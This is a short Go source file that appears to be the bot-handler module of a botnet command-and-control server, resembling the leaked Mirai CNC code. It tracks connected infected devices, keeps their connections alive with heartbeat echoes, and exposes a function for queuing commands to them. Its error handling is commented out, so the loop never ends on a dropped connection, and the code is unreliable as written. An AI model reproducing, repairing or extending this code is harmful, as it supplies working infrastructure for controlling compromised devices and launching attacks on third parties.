package main

import (
    "net"
    "time"
    "fmt"
)

type Bot struct {
    uid     int
    conn    net.Conn
    version byte
    source  string
}

func NewBot(conn net.Conn, version byte, source string) *Bot {
    fmt.Println("[CNC bot] NewBot()")
    return &Bot{-1, conn, version, source}
}

func (this *Bot) Handle() {
    fmt.Println("[CNC bot] Bot.Handle()")
    clientList.AddClient(this)
    defer clientList.DelClient(this)

    buf := make([]byte, 2)
    for {
        this.conn.SetDeadline(time.Now().Add(600 * time.Second))
        if n,err := this.conn.Read(buf); err != nil || n != len(buf) {
            //fmt.Printf("[CNC bot] Error leyendo: ")
            //fmt.Println(err)
            //return
        }
        if n,err := this.conn.Write(buf); err != nil || n != len(buf) {
            //fmt.Printf("[CNC bot] Error escribiendo: ")
            //fmt.Println(err)
            //return
        }
    }
}

func (this *Bot) QueueBuf(buf []byte) {
    this.conn.Write(buf)
}
